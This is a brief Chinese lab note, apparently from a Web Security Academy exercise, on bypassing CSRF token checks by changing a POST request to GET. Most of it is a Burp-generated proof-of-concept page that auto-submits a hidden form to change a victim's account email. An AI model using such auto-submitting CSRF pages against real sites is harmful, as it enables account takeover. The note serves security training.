# 知识点
通过将POST更改为GET方式绕过CSRF tokens认证
# 思路
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac401f2a1ef2a7ffc0a020e200ad0098.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="1395480051&#64;qq&#46;com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
